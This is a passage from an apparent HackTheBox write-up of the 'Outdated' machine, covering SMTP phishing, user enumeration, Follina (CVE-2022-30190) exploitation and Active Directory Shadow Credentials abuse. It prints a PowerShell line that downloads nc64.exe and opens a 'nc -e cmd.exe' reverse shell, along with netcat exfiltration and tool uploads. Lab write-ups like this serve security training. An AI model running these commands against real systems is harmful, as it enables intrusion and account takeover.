<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated sudo postconf <span class="at">-e</span> <span class="st">"mydestination = </span><span class="va">$myhostname</span><span class="st">, void, localhost.localdomain, localhost"</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated sudo postconf <span class="at">-e</span> <span class="st">"mynetworks = 127.0.0.0/8, 10.10.14.0/24"</span></span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated sudo postconf <span class="at">-e</span> <span class="st">"inet_interfaces = all"</span></span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated sudo postconf <span class="at">-e</span> <span class="st">"inet_protocols = ipv4"</span></span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated sudo postconf <span class="at">-e</span> <span class="st">"recipient_delimiter = +"</span></span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated sudo postconf <span class="at">-e</span> <span class="st">"lmtp_host_lookup = native"</span></span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated sudo postconf <span class="at">-e</span> <span class="st">"smtp_host_lookup = native"</span></span>
<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated service postfix restart</span>
<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated telnet localhost 25</span>
<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a><span class="ex">220</span> void.xxxxx.se ESMTP Postfix <span class="er">(</span><span class="ex">Debian/GNU</span><span class="kw">)</span></span>
<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="ex">ehlo</span> localhost</span>
<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a><span class="ex">250-void.xxxxx.se</span></span>
<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a><span class="ex">250-PIPELINING</span></span>
<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="ex">250-SIZE</span> 10240000</span>
<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a><span class="ex">250-VRFY</span></span>
<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a><span class="ex">250-ETRN</span></span>
<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a><span class="ex">250-STARTTLS</span></span>
<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a><span class="ex">250-ENHANCEDSTATUSCODES</span></span>
<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a><span class="ex">250-8BITMIME</span></span>
<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a><span class="ex">250-DSN</span></span>
<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a><span class="ex">250-SMTPUTF8</span></span>
<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a><span class="ex">250</span> CHUNKING</span>
<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a><span class="ex">mail</span> from: void@void</span>
<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a><span class="ex">250</span> 2.1.0 Ok</span>
<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a><span class="ex">rcpt</span> to: itsupport@outdated.htb</span>
<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a><span class="ex">250</span> 2.1.5 Ok</span>
<span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a><span class="ex">data</span></span>
<span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a><span class="ex">354</span> End data with <span class="op">&lt;</span>CR<span class="op">&gt;&lt;</span>LF<span class="op">&gt;</span>.<span class="op">&lt;</span>CR<span class="op">&gt;&lt;</span>LF<span class="op">&gt;</span></span>
<span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a><span class="ex">Subject:</span> Phishing</span>
<span id="cb3-33"><a href="#cb3-33" aria-hidden="true" tabindex="-1"></a><span class="ex">http://10.10.14.6:8080</span></span>
<span id="cb3-34"><a href="#cb3-34" aria-hidden="true" tabindex="-1"></a><span class="bu">.</span></span>
<span id="cb3-35"><a href="#cb3-35" aria-hidden="true" tabindex="-1"></a><span class="ex">250</span> 2.0.0 Ok: queued as 0C51812101C</span>
<span id="cb3-36"><a href="#cb3-36" aria-hidden="true" tabindex="-1"></a><span class="ex">quit</span></span>
<span id="cb3-37"><a href="#cb3-37" aria-hidden="true" tabindex="-1"></a><span class="ex">221</span> 2.0.0 Bye</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Verify that the mail has been sent by looking at <code>/var/log/mail.log</code> and verify that it has <strong>status = sent</strong>.</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated cat /var/log/mail.log</span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Aug</span> 15 10:51:28 void postfix/smtp<span class="pp">[</span><span class="ss">7917</span><span class="pp">]</span>: 0C51812101C: to=<span class="op">&lt;</span>itsupport@outdated.htb<span class="op">&gt;</span>, relay=outdated.htb<span class="pp">[</span><span class="ss">10.10.11.175</span><span class="pp">]</span>:25, delay=54, delays=43/0.01/0.08/11, dsn=2.0.0, status=sent <span class="er">(</span><span class="ex">250</span> Queued <span class="er">(</span><span class="ex">10.432</span> seconds<span class="kw">))</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Although the mail is sent and nothing seems to be out of the ordinary, we don’t get anything back. Testing other transmitters we see that the mail bounces due to <code>500: Unknown user</code>, if we had a list of potential users we could verify them this way.</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Aug</span> 15 10:58:37 void postfix/smtp<span class="pp">[</span><span class="ss">8307</span><span class="pp">]</span>: 7EEB6121020: to=<span class="op">&lt;</span>0xpthree@outdated.htb<span class="op">&gt;</span>, relay=outdated.htb<span class="pp">[</span><span class="ss">10.10.11.175</span><span class="pp">]</span>:25, delay=0.16, delays=0/0/0.09/0.07, dsn=5.0.0, status=bounced <span class="er">(</span><span class="ex">host</span> outdated.htb<span class="pp">[</span><span class="ss">10.10.11.175</span><span class="pp">]</span> said: 550 Unknown user <span class="er">(in</span> <span class="ex">reply</span> to RCPT TO command<span class="kw">))</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Aug</span> 15 11:00:20 void postfix/smtp<span class="pp">[</span><span class="ss">8325</span><span class="pp">]</span>: 90736121020: to=<span class="op">&lt;</span>Administrator@outdated.htb<span class="op">&gt;</span>, relay=outdated.htb<span class="pp">[</span><span class="ss">10.10.11.175</span><span class="pp">]</span>:25, delay=0.15, delays=0/0/0.08/0.06, dsn=5.0.0, status=bounced <span class="er">(</span><span class="ex">host</span> outdated.htb<span class="pp">[</span><span class="ss">10.10.11.175</span><span class="pp">]</span> said: 550 Unknown user <span class="er">(in</span> <span class="ex">reply</span> to RCPT TO command<span class="kw">))</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>At this point we have pretty much nothing, and since we don’t get any callbacks from SMTP it’s starting to feel like a rabbithole..<br>
We can continue enumerating further to see if I missed something, we can use <code>rpcclient</code> to enumerate all users in the machine.</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">## Find SID</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated rpcclient <span class="at">-U</span> <span class="st">""</span> 10.10.11.175    </span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Password</span> for [WORKGROUP<span class="dt">\]</span>:</span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> lookupnames Administrator</span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Administrator</span> S-1-5-21-4089647348-67660539-4016542185-500 <span class="er">(</span><span class="ex">User:</span> 1<span class="kw">)</span></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="co">## Bruteforce to find all users</span></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated for i in <span class="dt">{</span><span class="dv">1000</span><span class="dt">..</span><span class="dv">1200</span><span class="dt">}</span><span class="kw">;</span> <span class="cf">do</span> <span class="ex">rpcclient</span> <span class="at">--command</span><span class="op">=</span><span class="st">"lookupsids S-1-5-21-4089647348-67660539-4016542185-</span><span class="va">$i</span><span class="st">"</span> 10.10.11.175 <span class="at">-U</span> <span class="st">""</span> <span class="at">--password</span><span class="op">=</span><span class="kw">;</span> <span class="cf">done</span></span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="ex">S-1-5-21-4089647348-67660539-4016542185-1103</span> OUTDATED<span class="dt">\D</span>nsAdmins <span class="er">(</span><span class="ex">4</span><span class="kw">)</span></span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="ex">S-1-5-21-4089647348-67660539-4016542185-1104</span> OUTDATED<span class="dt">\D</span>nsUpdateProxy <span class="er">(</span><span class="ex">2</span><span class="kw">)</span></span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="ex">S-1-5-21-4089647348-67660539-4016542185-1105</span> OUTDATED<span class="dt">\C</span>LIENT$ <span class="er">(</span><span class="ex">1</span><span class="kw">)</span></span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="ex">S-1-5-21-4089647348-67660539-4016542185-1106</span> OUTDATED<span class="dt">\b</span>tables <span class="er">(</span><span class="ex">1</span><span class="kw">)</span></span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="ex">S-1-5-21-4089647348-67660539-4016542185-1107</span> OUTDATED<span class="dt">\I</span>TStaff <span class="er">(</span><span class="ex">2</span><span class="kw">)</span></span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="ex">S-1-5-21-4089647348-67660539-4016542185-1108</span> OUTDATED<span class="dt">\s</span>flowers <span class="er">(</span><span class="ex">1</span><span class="kw">)</span></span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="ex">S-1-5-21-4089647348-67660539-4016542185-1109</span> <span class="pp">*</span>unknown<span class="pp">*</span><span class="dt">\*</span>unknown<span class="pp">*</span> <span class="er">(</span><span class="ex">8</span><span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We find two users - <code>btables</code> &amp; <code>sflowers</code></p>
<p><strong>Asreproast</strong> fails:</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated impacket-GetNPUsers outdated.htb/ <span class="at">-usersfile</span> /htb/outdated/users.txt <span class="at">-format</span> hashcat <span class="at">-dc-ip</span> 10.10.11.175</span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Impacket</span> v0.10.0 <span class="at">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[-]</span> User administrator doesn<span class="st">'t have UF_DONT_REQUIRE_PREAUTH set</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="st">[-] User btables doesn'</span>t have UF_DONT_REQUIRE_PREAUTH set</span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[-]</span> User sflowers doesn<span class="st">'t have UF_DONT_REQUIRE_PREAUTH set</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>The initial vectors on this machine are slim and I can’t see any other way in then utilizing SMTP, especially since CVE-2022-30190 (Follina) is listed in the PDF, so I decide to reboot the box - but to no avail. At this point I needed a sanity check so I went to the HackTheBox discord to confirm my suspicions, and sure enough SMTP is the vector for foothold.</p>
<p>I waited for a day before continuing, and heard that the box should be fixed and more stable.</p>
<p>Instead of logging in to the remote SMTP server over telnet, or using my own local SMTP server, we can try a third option - <code>swaks</code>.</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated swaks <span class="at">--to</span> itsupport@outdated.htb <span class="at">--from</span> 0xpthree@exploit.se <span class="at">--server</span> mail.outdated.htb <span class="at">--body</span> <span class="st">"http://10.10.14.6/pwn.html"</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">===</span> Trying mail.outdated.htb:25...</span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">===</span> Connected to mail.outdated.htb.</span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>-  <span class="ex">220</span> mail.outdated.htb ESMTP</span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> EHLO void</span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>-  <span class="ex">250-mail.outdated.htb</span></span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>-  <span class="ex">250-SIZE</span> 20480000</span>
<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>-  <span class="ex">250-AUTH</span> LOGIN</span>
<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>-  <span class="ex">250</span> HELP</span>
<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> MAIL FROM:<span class="op">&lt;</span>0xpthree@exploit.se<span class="op">&gt;</span></span>
<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>-  <span class="ex">250</span> OK</span>
<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> RCPT TO:<span class="op">&lt;</span>itsupport@outdated.htb<span class="op">&gt;</span></span>
<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>-  <span class="ex">250</span> OK</span>
<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> DATA</span>
<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>-  <span class="ex">354</span> OK, send.</span>
<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> Date: Mon, 15 Aug 2022 15:14:51 +0200</span>
<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> To: itsupport@outdated.htb</span>
<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> From: 0xpthree@exploit.se</span>
<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> Subject: test Mon, 15 Aug 2022 15:14:51 +0200</span>
<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> Message-Id: <span class="op">&lt;</span>20220815151451.031141@void<span class="op">&gt;</span></span>
<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/</span>
<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> </span>
<span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> http://10.10.14.6/pwn.html</span>
<span id="cb8-24"><a href="#cb8-24" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> </span>
<span id="cb8-25"><a href="#cb8-25" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> </span>
<span id="cb8-26"><a href="#cb8-26" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> .</span>
<span id="cb8-27"><a href="#cb8-27" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>-  <span class="ex">250</span> Queued <span class="er">(</span><span class="ex">10.406</span> seconds<span class="kw">)</span></span>
<span id="cb8-28"><a href="#cb8-28" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span><span class="op">&gt;</span> QUIT</span>
<span id="cb8-29"><a href="#cb8-29" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>-  <span class="ex">221</span> goodbye</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated python3 <span class="at">-m</span> http.server 80                                                                                                         </span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er">(</span><span class="ex">http://0.0.0.0:80/</span><span class="kw">)</span> <span class="ex">...</span></span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.175</span> <span class="at">-</span> <span class="at">-</span> [16/Aug/2022 09:05:43] code 404, message File not found</span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.175</span> <span class="at">-</span> <span class="at">-</span> [16/Aug/2022 09:05:43] <span class="st">"GET /pwn HTTP/1.1"</span> 404 <span class="at">-</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>The machine is indeed fixed and now we get callbacks! However I had huge problems to get this next part to fly.</p>
<p>We want to utilize the CVE-2022-30190 (MSDT Follina) to download malicious scripts via en embeded link. To do this we use <a href="https://github.com/JohnHammond/msdt-follina">John Hammonds</a> script which will create a malicious <code>.doc</code> file, host a webserver with needed html payload, and will start a netcat listener for you.</p>
<p>The payload will try to download <code>nc64.exe</code> and upload it to the victim, which will then be used to create a reverse shell. The code for this points towards John Hammonds Github, so since this is HackTheBox we need to change that to point to our local attacking machine.</p>
<p>This is row 111 in <code>follina.py</code> after editing:</p>
<pre><code>command = f"""Invoke-WebRequest http://10.10.14.2:8888/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""</code></pre>
<p>We can now execute <code>follina.py</code> and on the first row we’ll find the staging directory - it looks something like this <code>[+] copied staging doc /tmp/67gup9zc</code>.</p>
<p><strong>Copy nc64.exe</strong> to <code>/tmp/67gup9zc/www</code> and now you’re ready to send your email.</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  msdt-follina ls <span class="at">-al</span> /tmp/67gup9zc/www</span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 64</span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 2 void void  4096 Aug 19 13:04 .</span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 4 void void  4096 Aug 19 12:54 ..</span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 void void  4689 Aug 19 12:54 index.html</span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxr-xr-x</span> 1 void void 45272 Aug 19 13:04 nc64.exe</span>
<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  msdt-follina sendEmail <span class="at">-t</span> itsupport@outdated.htb <span class="at">-f</span> 0xpthree@exploit.se <span class="at">-s</span> mail.outdated.htb <span class="at">-u</span> PleaseWork <span class="at">-m</span> <span class="st">'http://10.10.14.2/'</span></span>
<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Aug</span> 19 12:54:31 void sendEmail<span class="pp">[</span><span class="ss">17349</span><span class="pp">]</span>: Email was sent successfully!</span>
<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  msdt-follina python3 follina.py <span class="at">-i</span> tun0 <span class="at">-p</span> 80 <span class="at">-r</span> 4444     </span>
<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> copied staging doc /tmp/67gup9zc</span>
<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> created maldoc ./follina.doc</span>
<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> serving html payload on :80</span>
<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> starting <span class="st">'nc -lvnp 4444'</span> </span>
<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4444 ...</span>
<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.2</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.175]</span> 49822</span>
<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a><span class="ex">Microsoft</span> Windows [Version 10.0.19043.928]</span>
<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">c</span><span class="kw">)</span> <span class="ex">Microsoft</span> Corporation. All rights reserved.</span>
<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Users\btables\AppData\Local\Temp\SDIAG_9fb3a047-99c4-4779-8d48-a154f6f5936e</span><span class="op">&gt;</span>whoami</span>
<span id="cb11-22"><a href="#cb11-22" aria-hidden="true" tabindex="-1"></a><span class="ex">outdated\btables</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>NOTE:</strong> For me to figure this out I downloaded and setup a python3 http redirect to log and see what happened behind the scenes, this could also have been done using Wireshark or anything similar.</p>
<pre><code>➜  msdt-follina python3 redirect.py 80 http://10.10.14.2:8888
10.10.11.175 - - [19/Aug/2022 12:18:18] "GET / HTTP/1.1" 301 -
10.10.11.175 - - [19/Aug/2022 12:18:20] "GET /nc64.exe HTTP/1.1" 301 -</code></pre>
<p>With this information we can see that the script worked, but the payload delivery (of nc64.exe) didn’t.</p>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>Quickly look through the box as user <code>btables</code> and we see that <code>user.txt</code> is not here, maybe we need to move laterally to <code>sflowers</code> that we found earlier.</p>
<p>Upload <code>SharpHound.exe</code> to the target and start enumerating with BloodHound.</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\Tasks</span><span class="op">&gt;</span>curl http://10.10.14.2:8888/SharpHound.exe <span class="at">-o</span> C:<span class="dt">\W</span>indows<span class="dt">\T</span>asks<span class="dt">\S</span>harpHound.exe</span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\Tasks</span><span class="op">&gt;</span>dir</span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="ex">08/19/2022</span>  11:17 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          .</span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="ex">08/19/2022</span>  11:17 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          ..</span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="ex">08/19/2022</span>  11:17 AM           908,288 SharpHound.exe</span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="co">## Start listener to receive</span></span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated nc <span class="at">-lp</span> 1234 <span class="op">&gt;</span> SharpOut.zip</span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="co">## Send data</span></span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\Tasks</span><span class="op">&gt;</span>nc.exe <span class="at">-w3</span> 10.10.14.2 1234 <span class="op">&lt;</span> 20220819112306_SharpOut.zip</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>In BloodHound, mark user <code>btables</code> as Owned and search for <code>Administrator</code>. Press <code>Shortest Path to Here from Owned</code> and we see a nice path:</p>
<p><img src="images/outdated02.png" class="img-fluid"></p>
<p>Searching for <code>AddKeyCredentialLink</code>, we find <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">Shadow Credentials</a> and the tool <a href="https://github.com/eladshamir/Whisker">Whisker.exe</a> for exploitation. This technique allows an attacker to take over an AD user or computer account if the attacker can modify the target object’s (user or computer account) attribute <code>msDS-KeyCredentialLink</code> and append it with alternate credentials in the form of certificates.</p>
<p>Add the shadow credentials (modify the <code>msDS-KeyCredentialLink</code> attribute) to the vulnerable AD user <code>sflowers</code> using <a href="https://github.com/eladshamir/Whisker">Whisker.exe</a>.</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\Tasks</span><span class="op">&gt;</span>curl http://10.10.14.2:8888/Whisker.exe <span class="at">-o</span> C:<span class="dt">\W</span>indows<span class="dt">\T</span>asks<span class="dt">\W</span>hisker.exe</span>
